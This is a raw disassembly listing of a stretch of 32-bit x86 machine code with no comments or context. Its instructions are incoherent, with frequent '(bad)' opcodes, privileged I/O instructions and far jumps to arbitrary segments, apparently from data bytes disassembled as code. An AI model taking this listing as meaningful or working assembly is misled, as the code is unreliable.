  6aeb42:	(bad)  
  6aeb43:	dec    DWORD PTR [ebp-0x6d]
  6aeb46:	push   ebx
  6aeb47:	inc    esp
  6aeb48:	int3   
  6aeb49:	inc    edi
  6aeb4a:	(bad)  
  6aeb4b:	mov    ebx,edx
  6aeb4d:	into   
  6aeb4e:	push   edi
  6aeb4f:	jae    0x6aeaf6
  6aeb51:	pop    DWORD PTR [edi+0x27]
  6aeb54:	icebp  
  6aeb55:	jmp    0x6aeb26
  6aeb57:	fs stos DWORD PTR es:[edi],eax
  6aeb59:	jmp    0x6aeb9c
  6aeb5b:	push   cs
  6aeb5c:	cdq    
  6aeb5d:	push   edx
  6aeb5e:	xchg   esp,eax
  6aeb5f:	xor    al,BYTE PTR [edx]
  6aeb61:	jmp    0xf187:0x1564567f
  6aeb68:	mov    dh,0xb4
  6aeb6a:	jmp    FWORD PTR [ecx+0x3d7712f]
  6aeb70:	push   es
  6aeb71:	inc    esp
  6aeb72:	aam    0xf3
  6aeb74:	out    0x6,al
  6aeb76:	pop    esi
  6aeb77:	push   es
  6aeb78:	mov    eax,ds:0x43e4b698
  6aeb7d:	sub    al,0x75
  6aeb7f:	daa    
  6aeb80:	fistp  WORD PTR [bp+di+0x7a5a]
  6aeb85:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6aeb87:	inc    edx
  6aeb88:	rol    BYTE PTR [edx],1
  6aeb8a:	ret    0x1853
  6aeb8d:	lahf   
  6aeb8e:	mov    ch,0xca
  6aeb90:	adc    esi,edi
  6aeb92:	adc    eax,0x19bc5a
  6aeb97:	icebp  
  6aeb98:	icebp  
  6aeb99:	dec    eax
  6aeb9a:	dec    edi
  6aeb9b:	cmp    eax,0xf425e2f4
  6aeba0:	mov    WORD PTR [ebx+0x6],ss
  6aeba3:	inc    esp
  6aeba4:	xor    edi,ebp
  6aeba6:	adc    DWORD PTR [esi+0x4eaa312c],ecx
  6aebac:	inc    ebp
  6aebad:	imul   edi,edx,0xb7fd3ad7
  6aebb3:	loop   0x6aeb3b
  6aebb5:	lods   eax,DWORD PTR ds:[esi]
  6aebb6:	xchg   ebx,eax
  6aebb7:	or     ch,BYTE PTR [edi+0x3c6d972]
  6aebbd:	daa    
  6aebbe:	out    dx,al
  6aebbf:	stc    
  6aebc0:	add    bl,BYTE PTR [ebx+0x74]
  6aebc3:	sbb    edi,DWORD PTR [eax]
  6aebc5:	mov    DWORD PTR [ebx-0x2d601830],esi
  6aebcb:	xchg   BYTE PTR [esi],bh
  6aebcd:	push   ebx
  6aebce:	push   ecx
  6aebcf:	(bad)  
  6aebd0:	shr    BYTE PTR [esi-0x53a37a],1
  6aebd6:	mov    al,ds:0xddcade0
  6aebdb:	fs mov dh,0x1d
  6aebde:	mov    ebx,0xf3349036
  6aebe3:	jp     0x6aec1f
  6aebe5:	and    DWORD PTR [esi-0x58bd90eb],ebp
  6aebeb:	push   ds
  6aebec:	dec    edx
  6aebed:	popa   
  6aebee:	mov    ebp,0x590f3b1d
  6aebf3:	xor    BYTE PTR [ecx-0x21],bl
  6aebf6:	sub    al,0x72
  6aebf8:	jo     0x6aec35
  6aebfa:	sub    esp,DWORD PTR [edi]
  6aebfc:	(bad)  
  6aebfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6aebfe:	cld    
  6aebff:	jle    0x6aec6a
  6aec01:	call   0x98c71a0
  6aec06:	xor    BYTE PTR ds:0x48084df4,0x6e
  6aec0d:	xchg   esi,eax
  6aec0e:	out    dx,al
  6aec0f:	pop    ebp
  6aec10:	mov    ds:0x9fba4e80,al
  6aec15:	dec    esp
  6aec16:	xor    eax,0xd3e67dfa
  6aec1b:	pop    edi
  6aec1c:	cmp    esp,DWORD PTR [ebp-0x7f]
  6aec1f:	scas   al,BYTE PTR es:[edi]
  6aec20:	aad    0x8d
  6aec22:	adc    eax,0xafa3482d
  6aec27:	sbb    eax,0x2124ae67
  6aec2c:	xchg   esp,eax
  6aec2d:	push   0x17f7f616
  6aec32:	shl    BYTE PTR [ecx-0x741144ca],0x0
  6aec39:	add    al,0xb
  6aec3b:	test   DWORD PTR [ebp+ebx*8+0x4c],0xc5193fbe
  6aec43:	lods   al,BYTE PTR ds:[esi]
  6aec44:	adc    edx,DWORD PTR [esi]
  6aec46:	retf   0x575d
  6aec49:	cld    
  6aec4a:	iret   
  6aec4b:	ror    BYTE PTR [ebx-0x4094ccb3],0xd7
  6aec52:	mov    eax,ds:0xdefea49c
  6aec57:	pop    ss
  6aec58:	enter  0x1c66,0x23
  6aec5c:	ins    BYTE PTR es:[edi],dx
  6aec5d:	mov    ebx,0xf778aaba
  6aec62:	(bad)  
  6aec63:	std    
  6aec64:	xchg   edi,eax
  6aec65:	mov    al,ds:0xaa42e74
  6aec6a:	mov    ds:0xb8a0420e,al
  6aec6f:	fdiv   st(7),st
  6aec71:	pop    ecx
  6aec72:	lods   al,BYTE PTR ds:[esi]
  6aec73:	cmc    
  6aec74:	pop    edi
  6aec75:	cdq    
  6aec76:	jnp    0x6aece7
  6aec78:	std    
  6aec79:	icebp  
  6aec7a:	and    al,0xd5
  6aec7c:	push   es
  6aec7d:	sbb    BYTE PTR [ebx+0x10],0x22
  6aec81:	test   BYTE PTR [edx],ch
  6aec83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6aec84:	sbb    eax,0xc4cfee8c
  6aec89:	push   eax
  6aec8a:	mov    BYTE PTR ds:0x76b53aae,al
  6aec90:	jmp    0x2438:0xce826bdb
  6aec97:	mov    cl,0x7
  6aec99:	aas    
  6aec9a:	ja     0x6aeca1
  6aec9c:	xchg   esp,eax
  6aec9d:	arpl   di,sp
  6aec9f:	mov    cl,BYTE PTR [ebx]
  6aeca1:	icebp  
  6aeca2:	adc    ecx,edx
  6aeca4:	xor    DWORD PTR [ebx+0x4f],ebp
  6aeca7:	outs   dx,BYTE PTR ds:[esi]
  6aeca8:	push   ebx
  6aeca9:	mov    bh,0x71
  6aecab:	ins    BYTE PTR es:[edi],dx
  6aecac:	inc    ebp
  6aecad:	enter  0xab1e,0x27
  6aecb1:	or     esp,DWORD PTR [ecx+0x61]
  6aecb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6aecb5:	(bad)  
  6aecb6:	cmp    al,0x6
  6aecb8:	mov    BYTE PTR [edi-0x56fbc92f],ah
  6aecbe:	push   esp
  6aecbf:	fwait
  6aecc0:	test   eax,0x2cda2a2
  6aecc5:	cld    
  6aecc6:	repz jae 0x6aecd3
  6aecc9:	jae    0x6aecbe
  6aeccb:	push   ebx
  6aeccc:	sar    DWORD PTR [ebp+0x15],1
  6aeccf:	cs (bad) 
  6aecd1:	pop    edx
  6aecd2:	test   BYTE PTR [ebx+0x7e],bl
  6aecd5:	and    eax,0xca8aad65
  6aecda:	xchg   esp,eax
  6aecdb:	loope  0x6aece3
  6aecdd:	xchg   DWORD PTR [esp+eax*1],ecx
  6aece0:	nop
  6aece1:	(bad)  
  6aece2:	(bad)
  6aece5:	xor    ch,0x55
  6aece8:	(bad)  
  6aece9:	jmp    DWORD PTR [ecx]
  6aeceb:	jmp    0x6aed66
  6aeced:	add    BYTE PTR [ebx],cl
  6aecef:	je     0x6aecfc
  6aecf1:	sub    BYTE PTR [edx-0x71ea4f76],bl
  6aecf7:	pushf  
  6aecf8:	cld    
  6aecf9:	in     eax,0x15
  6aecfb:	mov    ch,0xc6
  6aecfd:	cld    
  6aecfe:	push   esi
  6aecff:	or     BYTE PTR [ecx-0x7eb2ba79],0x60
  6aed06:	push   esp
  6aed07:	lahf   
  6aed08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6aed09:	mov    ds:0x2ece0bcd,al
  6aed0e:	int    0x9e
  6aed10:	xor    ch,bl
  6aed12:	int    0xc7
  6aed14:	sbb    BYTE PTR [edi-0x48465e34],dh
  6aed1a:	stc    
  6aed1b:	cld    
  6aed1c:	sub    eax,0x963260bd
  6aed21:	ror    DWORD PTR [esi+edx*4],1
  6aed24:	fs adc al,0x67
  6aed27:	mov    gs,esp
  6aed29:	out    0x1e,al
  6aed2b:	sub    esp,DWORD PTR ds:0x437fcd8c
  6aed31:	or     ch,BYTE PTR [ebx]
  6aed33:	daa    
  6aed34:	jmp    0x668e47b5
  6aed39:	push   0xfc1ebf6e
  6aed3e:	std    
  6aed3f:	xchg   edi,eax
  6aed40:	ret    
  6aed41:	stos   DWORD PTR es:[edi],eax
  6aed42:	ins    BYTE PTR es:[edi],dx
  6aed43:	loopne 0x6aeda8
  6aed45:	push   ebx
  6aed46:	push   ecx
  6aed47:	scas   eax,DWORD PTR es:[edi]
  6aed48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6aed49:	adc    al,0x11
  6aed4b:	dec    ebx
  6aed4c:	jmp    0x4c204947
  6aed51:	jp     0x6aed33
  6aed53:	mov    bl,0xe3
  6aed55:	mov    ch,0x6e
  6aed57:	or     eax,0x9ee8e11c
  6aed5c:	add    DWORD PTR [edx+0x129f125f],0x20bfa0dd
  6aed66:	(bad)  
  6aed67:	mov    al,0xe9
  6aed69:	add    edi,ebx
  6aed6b:	mov    ds:0xb10b5347,al
  6aed70:	mov    edi,0x400bb121
  6aed75:	out    0xd8,al
  6aed77:	and    DWORD PTR [edx-0x4a0fb065],0xe79d028
  6aed81:	mov    BYTE PTR [esi],dl
  6aed83:	jg     0x6aed0f
  6aed85:	hlt    
  6aed86:	in     eax,0x25
  6aed88:	inc    DWORD PTR [edi+0x19f24aa7]
  6aed8e:	outs   dx,DWORD PTR ds:[esi]
  6aed8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6aed90:	sub    BYTE PTR [edx+0x7c],ch
  6aed93:	xor    eax,0x8725be8
  6aed98:	push   esp
  6aed99:	pop    ds
  6aed9a:	sbb    DWORD PTR [ebp+0x3b],esp
  6aed9d:	ds imul edx,eax,0xaef79bf0
  6aeda4:	aad    0xce
  6aeda6:	iret   
  6aeda7:	call   0x407a:0x448c79f9
  6aedae:	imul   esp,DWORD PTR [ecx],0xe54c4af5
  6aedb4:	(bad)  
  6aedb6:	ret    0x321d
  6aedb9:	jecxz  0x6aedcc
  6aedbb:	test   al,0x97
  6aedbd:	fbld   TBYTE PTR [ecx]
  6aedbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6aedc0:	push   ecx
  6aedc1:	jns    0x6aed8b
  6aedc3:	pop    edx
  6aedc4:	dec    edi
  6aedc5:	scas   eax,DWORD PTR es:[edi]
  6aedc6:	pop    esp
  6aedc7:	aam    0x97
  6aedc9:	xchg   DWORD PTR [esp+eax*1+0x47ae4271],esp
  6aedd0:	xchg   ecx,eax
  6aedd1:	scas   al,BYTE PTR es:[edi]
  6aedd2:	sti    
  6aedd3:	imul   edx,DWORD PTR ds:[ecx-0x471c25ca],0xffffffb6
  6aeddb:	or     edi,edx
  6aeddd:	mov    cl,0x50
  6aeddf:	scas   eax,DWORD PTR es:[edi]
  6aede0:	cwde   
  6aede1:	push   ss
  6aede2:	xchg   edi,eax
  6aede3:	bound  ebx,QWORD PTR [edi-0x56279cf9]
  6aede9:	jno    0x6aedc8
  6aedeb:	mov    al,ds:0xa9fe53f0
  6aedf0:	call   0x60cb:0x5344250
  6aedf7:	aaa    
  6aedf8:	bound  ebx,QWORD PTR [edx-0x4a]
  6aedfb:	mov    edi,0xbe48ff4d
  6aee00:	ficom  DWORD PTR [edi+0x263480d]
  6aee06:	adc    al,0x26
  6aee08:	(bad)  
  6aee09:	fs pop ebp
  6aee0b:	and    DWORD PTR [edx+0x3d],edx
  6aee0e:	mov    ds:0xc1a1675a,eax
  6aee13:	out    dx,eax
  6aee14:	outs   dx,DWORD PTR ds:[esi]
  6aee15:	movzx  ecx,WORD PTR [esi]
  6aee18:	scas   eax,DWORD PTR es:[edi]
  6aee19:	je     0x6aee79
  6aee1b:	pop    eax
  6aee1c:	or     eax,0x7f2fc5e9
  6aee21:	ret    0xd9cf
  6aee24:	or     al,0x72
  6aee26:	push   es
  6aee27:	jne    0x6aee98
  6aee29:	and    BYTE PTR ds:0x3debc8a5,dl
  6aee2f:	clc    
  6aee30:	adc    BYTE PTR [esi],0x29
  6aee33:	pop    edi
  6aee34:	mov    esp,0x8ae14cfc
  6aee39:	cwde   
  6aee3a:	std    
  6aee3b:	idiv   ch
  6aee3d:	xor    al,0x4a
  6aee3f:	push   ebp
  6aee40:	sub    ecx,DWORD PTR [edi-0x74c727f8]
  6aee46:	xchg   ebx,eax
  6aee47:	xor    BYTE PTR [ebx+ecx*1+0x4b],ch
  6aee4b:	sub    BYTE PTR [ecx+0x54ac2a2d],bl
  6aee51:	mov    dh,0x1a
  6aee53:	mov    ecx,0x1b4c7fd2
  6aee58:	pop    ds
  6aee59:	fdiv   DWORD PTR [ebx-0x2ffe8f0c]
  6aee5f:	push   ebx
  6aee60:	adc    ah,bl
  6aee62:	dec    edi
  6aee63:	(bad)  
  6aee64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6aee65:	sti    
  6aee66:	aad    0x1
  6aee68:	mov    ebx,0x1e0b01d9
  6aee6d:	and    eax,0x6ddb4b3a
  6aee72:	test   BYTE PTR [edi-0x7fe976be],bl
  6aee78:	jl     0x6aee00
  6aee7a:	daa    
  6aee7b:	jecxz  0x6aeef3
  6aee7d:	xchg   esp,eax
  6aee7e:	int    0x9a
  6aee80:	ins    DWORD PTR es:[edi],dx
  6aee81:	cmp    DWORD PTR [ecx],esp
  6aee83:	movd   DWORD PTR [edx+eax*8+0xdc590e3],mm1
  6aee8b:	outs   dx,DWORD PTR ds:[esi]
  6aee8c:	pop    edx
  6aee8d:	pusha  
  6aee8e:	dec    ebp
  6aee8f:	jbe    0x6aee3e
  6aee91:	push   es
  6aee92:	pop    esp
  6aee93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6aee94:	les    ebx,FWORD PTR [ebx-0x9]
  6aee97:	fdivr  st(0),st
  6aee99:	cmp    BYTE PTR [ecx],ah
  6aee9b:	repnz inc edi
  6aee9d:	(bad)  
  6aee9e:	jl     0x6aeecc
  6aeea0:	nop
  6aeea1:	pop    eax
  6aeea2:	xchg   edx,eax
  6aeea3:	add    DWORD PTR [edx+ebx*2+0x143ca15e],eax
  6aeeaa:	dec    esi
  6aeeab:	adc    ch,BYTE PTR [ebx+0x38bb5c82]
  6aeeb1:	jle    0x6aee4c
  6aeeb3:	sbb    DWORD PTR [edx+0x41a4adb5],ebp
  6aeeb9:	pushf  
  6aeeba:	iret   
  6aeebb:	imul   ebp,DWORD PTR [esi],0xfffffff4
  6aeebe:	sbb    DWORD PTR [ebx+0x77a3be28],edx
  6aeec4:	test   ecx,ebp
  6aeec6:	xchg   BYTE PTR [eax],al
  6aeec8:	inc    ebx
  6aeec9:	les    edi,FWORD PTR [esi+0x543e0061]
  6aeecf:	dec    ebx
  6aeed0:	mov    dl,0x1f
  6aeed2:	test   al,0x5a
  6aeed4:	imul   edi,DWORD PTR [ecx+0x644517c7],0x2d244d2a
  6aeede:	mov    dl,dh
  6aeee0:	retf   
  6aeee1:	fnstsw WORD PTR [edi-0x6f]
  6aeee4:	call   0x7e5c:0x7c5dd264
  6aeeeb:	sub    eax,0x37c222e7
  6aeef0:	adc    BYTE PTR ds:0x96eda49d,cl
  6aeef6:	sbb    BYTE PTR [edi],ah
  6aeef8:	mul    BYTE PTR [esp+edx*2]
  6aeefb:	retf   0xc9f2
  6aeefe:	scas   eax,DWORD PTR es:[edi]
  6aeeff:	sar    edi,cl
  6aef01:	(bad)  
  6aef02:	fwait
  6aef03:	xchg   ecx,eax
  6aef04:	test   BYTE PTR [ecx],dh
  6aef06:	pop    esi
  6aef07:	jle    0x6aeea1
  6aef09:	loope  0x6aef85
  6aef0b:	pop    ebx
  6aef0c:	mov    DWORD PTR [eax-0x6cc97dcf],esp
  6aef12:	sub    eax,0x30089ac1
  6aef17:	and    ah,BYTE PTR [edx+0x6b6cf6be]
  6aef1d:	mov    ds:0x6ce62c7f,al
  6aef22:	push   eax
  6aef23:	sti    
  6aef24:	and    eax,0xed72ce04
  6aef29:	mov    edi,0x15fd8ccf
  6aef2e:	mov    cl,al
  6aef30:	stos   DWORD PTR es:[edi],eax
  6aef31:	push   esp
  6aef32:	sub    eax,0xa5ca9e01
  6aef37:	mov    al,ds:0x9fc3cc8f
  6aef3c:	sahf   
  6aef3d:	push   esp
  6aef3e:	dec    edx
  6aef3f:	stos   DWORD PTR es:[edi],eax
  6aef40:	sub    bh,dl
  6aef42:	lods   al,BYTE PTR ds:[esi]
  6aef43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6aef44:	mov    BYTE PTR [esi],ch
  6aef46:	lea    ebp,[edx-0x37c67ffc]
  6aef4c:	push   ss
  6aef4d:	fidivr DWORD PTR [edi+0x61e9b109]
  6aef53:	inc    ebp
  6aef54:	xor    DWORD PTR [edi+0x6a],ebx
  6aef57:	adc    eax,0x37c09f38
  6aef5c:	scas   al,BYTE PTR es:[edi]
  6aef5d:	leave  
  6aef5e:	dec    esi
  6aef5f:	inc    esp
  6aef60:	or     ebx,DWORD PTR [ecx]
  6aef62:	cdq    
  6aef63:	in     eax,0x6c
  6aef65:	and    cl,BYTE PTR [edi-0x1dcee4ac]
  6aef6b:	pop    esp
  6aef6c:	test   dh,0x99
  6aef6f:	adc    bh,BYTE PTR [esi]
  6aef71:	inc    eax
  6aef72:	pop    ebp
  6aef73:	sbb    BYTE PTR [ebp+0x74915d1b],bh
  6aef79:	xor    DWORD PTR [eax],edx
  6aef7b:	sbb    DWORD PTR [eax+0x1],ebx
  6aef7e:	lods   ax,WORD PTR ds:[esi]
  6aef80:	leave  
  6aef81:	test   al,dh
  6aef83:	in     al,dx
  6aef84:	bound  edx,QWORD PTR [edx]
  6aef86:	and    ch,dl
  6aef88:	add    al,0x72
  6aef8a:	and    BYTE PTR [ebp+edi*2+0x75],al
  6aef8e:	cmp    dh,ch
  6aef90:	jge    0x6aefb3
  6aef92:	pop    ds
  6aef93:	push   ds
  6aef94:	xor    ebx,DWORD PTR ds:0x2fa89b97
  6aef9a:	jge    0x6aef3a
  6aef9c:	lock popa 
  6aef9e:	int    0x23
  6aefa0:	jl     0x6aefb4
  6aefa2:	sub    al,0x66
  6aefa4:	mov    eax,0x293cc610
  6aefa9:	or     al,0xbd
  6aefab:	pop    eax
  6aefac:	(bad)  
  6aefad:	jmp    0x3c1f:0x4cf1e83c
  6aefb4:	sar    DWORD PTR [ebx],0x13
  6aefb7:	xchg   edi,eax
  6aefb8:	in     al,dx
  6aefb9:	cmp    ecx,edi
  6aefbb:	dec    ebx
  6aefbc:	cmp    cl,bh
  6aefbe:	out    0xc3,al
  6aefc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6aefc1:	or     eax,0x63c9d7c1
  6aefc6:	out    dx,al
  6aefc7:	lods   eax,DWORD PTR ds:[esi]
  6aefc8:	popf   
  6aefc9:	in     al,0x4
  6aefcb:	jge    0x6aefde
  6aefcd:	in     eax,dx
  6aefce:	mov    eax,0xa83b85cb
  6aefd3:	cmp    DWORD PTR [edx+0x68],esp
  6aefd6:	adc    DWORD PTR [edx+ebx*1+0xf8e138d],0x54
  6aefde:	nop
  6aefdf:	xor    al,0xa8
  6aefe1:	pushf  
  6aefe2:	pop    eax
  6aefe3:	iret   
  6aefe4:	ror    BYTE PTR [ebx],0x8d
  6aefe7:	ds mov ebp,0xb9d7b6e
  6aefed:	out    0xdb,eax
  6aefef:	stos   BYTE PTR es:[edi],al
  6aeff0:	les    ebx,FWORD PTR [esi+0x61]
  6aeff3:	mov    edx,0xfdcbf8b3
  6aeff8:	inc    ebp
  6aeff9:	ror    BYTE PTR [eax+0xa],cl
  6aeffc:	ins    BYTE PTR es:[edi],dx
  6aeffd:	xor    edi,ebx
  6aefff:	dec    ebp
  6af000:	mov    bh,0xdc
  6af002:	neg    edi
  6af004:	jle    0x6af008
  6af006:	pop    esi
  6af007:	and    DWORD PTR gs:[edx+ecx*4+0x26],esi
  6af00c:	xchg   esi,eax
  6af00d:	sbb    edx,DWORD PTR [esi+0xd5a2a91]
  6af013:	mov    al,0x2
  6af015:	xchg   esi,eax
  6af016:	data16 cmp al,0x89
  6af019:	cwde   
  6af01a:	adc    bh,ch
  6af01c:	(bad)  
  6af01d:	dec    edi
  6af01e:	and    edi,DWORD PTR [ebp+0x7eb62f37]
  6af024:	(bad)  
  6af025:	and    eax,0x1527b0d3
  6af02a:	pop    edi
  6af02b:	sti    
  6af02c:	adc    ecx,DWORD PTR [edi+0x6f]
  6af02f:	jmp    0x6aefff
  6af031:	in     al,0xf
  6af033:	(bad)  [esi+0x61]
  6af036:	jmp    0x9575:0xc9c88047
  6af03d:	cdq    
  6af03e:	mov    ds:0xa04c5a6,eax
  6af043:	push   edx
  6af044:	lods   eax,DWORD PTR ds:[esi]
  6af045:	(bad)  
  6af046:	sti    
  6af047:	std    
  6af048:	jns    0x6af01b
  6af04a:	test   DWORD PTR [esi],edi
  6af04c:	or     bh,al
  6af04e:	cmp    esi,esp
  6af050:	stos   BYTE PTR es:[edi],al
  6af051:	or     al,0x80
  6af053:	das    
  6af054:	push   ds
  6af055:	adc    cl,BYTE PTR [ebp-0xd]
  6af058:	pushf  
  6af059:	push   eax
  6af05a:	ret    0xbe7d
  6af05d:	mov    ecx,0xfe7391d5
  6af062:	(bad)  
  6af063:	sub    DWORD PTR [ebx],ecx
  6af065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6af066:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6af067:	lahf   
  6af068:	pop    eax
  6af069:	sahf   
  6af06a:	mov    eax,ds:0x82c4ddd7
  6af06f:	dec    eax
  6af070:	mov    ah,0x99
  6af072:	xchg   ebx,eax
  6af073:	and    eax,0x9378d391
  6af078:	cmp    DWORD PTR [edi-0x7557fec2],edx
  6af07e:	ret    
  6af07f:	xchg   DWORD PTR [edx-0x3b012a75],ebp
  6af085:	sub    BYTE PTR [edi+0x7c],ah
  6af088:	mov    ecx,0xe6c363a1
  6af08d:	test   al,0xd4
  6af08f:	dec    esi
  6af090:	ins    BYTE PTR es:[edi],dx
  6af091:	push   ds
  6af092:	push   ecx
  6af093:	push   ebp
  6af094:	adc    bh,al
  6af096:	(bad)  
  6af097:	push   ecx
  6af098:	aaa    
  6af099:	xor    BYTE PTR [edi],0x4
  6af09c:	pop    ebx
  6af09d:	call   0x6fed8a25
  6af0a2:	div    BYTE PTR [edi+0x3e]
  6af0a5:	aas    
  6af0a6:	fcom   QWORD PTR [eax-0x51]
  6af0a9:	jo     0x6af06a
  6af0ab:	xor    edx,esp
  6af0ad:	xchg   esi,eax
  6af0ae:	mov    bh,0x13
  6af0b0:	push   esp
  6af0b1:	imul   eax,DWORD PTR [edx-0x53],0x174a32c7
  6af0b8:	in     eax,dx
  6af0b9:	pop    edx
  6af0ba:	mov    esi,0xbafcf779
  6af0bf:	inc    ebp
  6af0c0:	push   ebp
  6af0c1:	sub    dl,BYTE PTR [edi+ecx*1-0x2e0ea4d0]
  6af0c8:	imul   ebx,DWORD PTR [esi-0x4f468e46],0x3283e5ae
  6af0d2:	rcr    DWORD PTR [eax],1
  6af0d4:	ds push ecx
  6af0d6:	fwait
  6af0d7:	mov    eax,ds:0x662e619f
  6af0dc:	sahf   
  6af0dd:	fld    TBYTE PTR [eax+0x157ac1b0]
  6af0e3:	sbb    DWORD PTR [edi+0x7f],eax
  6af0e6:	xchg   esi,eax
  6af0e7:	inc    esi
  6af0e8:	sar    DWORD PTR [ebp+0x11],cl
  6af0eb:	push   es
  6af0ec:	jge    0x6af157
  6af0ee:	imul   ecx,DWORD PTR [ecx+ecx*8-0x5d720b08],0x1
  6af0f6:	cmp    al,0xba
  6af0f8:	mov    ecx,0x94beecd1
  6af0fd:	pop    ss
  6af0fe:	push   esp
  6af0ff:	and    dh,ah
  6af101:	call   0xfe8ae04f
  6af106:	fadd   QWORD PTR [ecx+0x44]
  6af109:	(bad)  
  6af10a:	push   ebx
  6af10b:	mov    esp,0x416ca487
  6af110:	icebp  
  6af111:	sbb    BYTE PTR [eax+ebp*1],al
  6af114:	fnsave [esi+0x18]
  6af117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6af118:	pop    es
  6af119:	push   ss
  6af11a:	test   al,0x24
  6af11c:	fisub  DWORD PTR [ebx+0xe]
  6af11f:	cmp    al,0xc9
  6af121:	fsubr  st,st(3)
  6af123:	adc    DWORD PTR [esi+0x2c],ebx
  6af126:	(bad)  
  6af127:	hlt    
  6af128:	in     eax,dx
  6af129:	jge    0x6af176
  6af12b:	mov    esp,0x1709dba
  6af130:	loop   0x6af0c7
  6af132:	sub    edi,0x9b52646d
  6af138:	pop    eax
  6af139:	loopne 0x6af199
  6af13b:	jbe    0x6af0bd
  6af13d:	ja     0x6af1b8
  6af13f:	push   0x4a25a49d
  6af144:	jns    0x6af110
  6af146:	mov    bl,0xce
  6af148:	xchg   ebx,eax
  6af149:	loope  0x6af106
  6af14b:	mov    eax,0xee55839c
  6af150:	lahf   
  6af151:	sbb    eax,0xf1f47b74
  6af156:	mov    esp,0x651df1ee
  6af15b:	xchg   edi,eax
  6af15c:	addr16 sbb al,0xe6
  6af15f:	ss in  al,dx
  6af161:	push   eax
  6af162:	nop
  6af163:	mov    cl,0xcc
  6af165:	sbb    al,0x4d
  6af167:	push   cs
  6af168:	clc    
  6af169:	sub    DWORD PTR [ebx+0x38],ebx
  6af16c:	mov    dh,0xe9
  6af16e:	out    dx,al
  6af16f:	in     al,dx
  6af170:	fisttp QWORD PTR [eax-0x7c57eedc]
  6af176:	dec    esi
  6af177:	xchg   edx,eax
  6af178:	xlat   BYTE PTR ds:[ebx]
  6af179:	pop    eax
  6af17a:	les    ecx,FWORD PTR [edi-0x38]
  6af17d:	mov    cl,0xb6
  6af17f:	and    al,0x7
  6af181:	adc    BYTE PTR [edx-0x43],dh
  6af184:	xor    al,0xc2
  6af186:	loope  0x6af1a2
  6af188:	gs pop esp
  6af18a:	repz xchg ebx,eax
  6af18c:	inc    esi
  6af18d:	jbe    0x6af154
  6af18f:	inc    ebx
  6af190:	ror    BYTE PTR [edx+0x25ff07dd],cl
  6af196:	inc    esp
  6af197:	cwde   
  6af198:	jmp    0x6af1b9
  6af19a:	push   ds
  6af19b:	and    esi,DWORD PTR [esi+ebp*1+0x19c59dce]
  6af1a2:	lahf   
  6af1a3:	jb     0x6af151
  6af1a5:	jmp    0x2873:0x2f744d50
  6af1ac:	xchg   ebp,eax
  6af1ad:	or     ebx,DWORD PTR [ecx+0x33]
  6af1b0:	or     eax,0x31ce08f5
  6af1b5:	in     eax,0x43
  6af1b7:	xor    al,0x22
  6af1b9:	rol    ebx,0xe9
  6af1bc:	or     DWORD PTR [ebp-0x3],ebx
  6af1bf:	and    bh,BYTE PTR [ebx]
  6af1c1:	cmp    BYTE PTR [eax-0x59af2f1],0x7e
  6af1c8:	cmp    DWORD PTR [ecx],eax
  6af1ca:	(bad)  
  6af1cb:	aaa    
  6af1cc:	push   ss
  6af1cd:	xor    dh,BYTE PTR [eax+0x1]
  6af1d0:	mov    bl,0xce
  6af1d2:	cmp    eax,DWORD PTR [ecx+ebx*4]
  6af1d5:	je     0x6af179
  6af1d7:	mov    esi,0xfbcdfc84
  6af1dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6af1dd:	lea    eax,[ebp+0x61]
  6af1e0:	or     esp,ebx
  6af1e2:	ds cld 
  6af1e4:	mov    al,0x3e
  6af1e6:	xchg   ecx,eax
  6af1e7:	cmp    eax,DWORD PTR [eax-0x7d]
  6af1ea:	je     0x6af1b9
  6af1ec:	cmp    edx,DWORD PTR [ecx]
  6af1ee:	icebp  
  6af1ef:	xchg   BYTE PTR [ebx+0x7f],dh
  6af1f2:	cmp    esi,edx
  6af1f4:	and    DWORD PTR [edi],ebx
  6af1f6:	pop    ss
  6af1f7:	popa   
  6af1f8:	lea    esp,[esi+0x54d04f5a]
  6af1fe:	push   cs
  6af1ff:	fst    DWORD PTR [edi+0x5ba8cfbd]
  6af205:	ret    
  6af206:	push   ebx
  6af207:	in     eax,dx
  6af208:	fnstenv [esi]
  6af20a:	std    
  6af20b:	test   BYTE PTR [ebp+0x73],ah
  6af20e:	cmc    
  6af20f:	ret    
  6af210:	retf   
  6af211:	jmp    DWORD PTR [edx-0x7f64b44]
  6af217:	dec    ecx
  6af218:	cld    
  6af219:	or     eax,0x42f471ce
  6af21e:	jmp    0x6af1f0
  6af220:	loop   0x6af1d1
  6af222:	jo     0x6af241
  6af224:	cli    
  6af225:	mov    eax,ds:0x910cc255
  6af22a:	(bad)  
  6af22b:	hlt    
  6af22c:	xor    ebp,DWORD PTR [edi+esi*4-0x3d2bad34]
  6af233:	(bad)  
  6af234:	das    
  6af235:	dec    ebx
  6af236:	ror    BYTE PTR [edx+0x4],1
  6af239:	cli    
  6af23a:	stos   DWORD PTR es:[edi],eax
  6af23b:	adc    edx,ebp
  6af23d:	(bad)  
  6af23e:	cmp    eax,0x7adaad2f
  6af243:	push   ebx
  6af244:	fnsave [ebx-0x32]
  6af247:	cmp    ebx,DWORD PTR [esi+0x7588c1c9]
  6af24d:	inc    edx
  6af24e:	in     eax,dx
  6af24f:	sbb    eax,0x2cf56401
  6af254:	jmp    0x6a6901a0
  6af259:	cld    
  6af25a:	push   ds
  6af25b:	inc    eax
  6af25c:	jecxz  0x6af2db
  6af25e:	pop    ds
  6af25f:	jl     0x6af282
  6af261:	mov    ds:0x8b8778ed,eax
  6af266:	mul    DWORD PTR [eax+edx*4+0x13]
  6af26a:	sub    al,0x4a
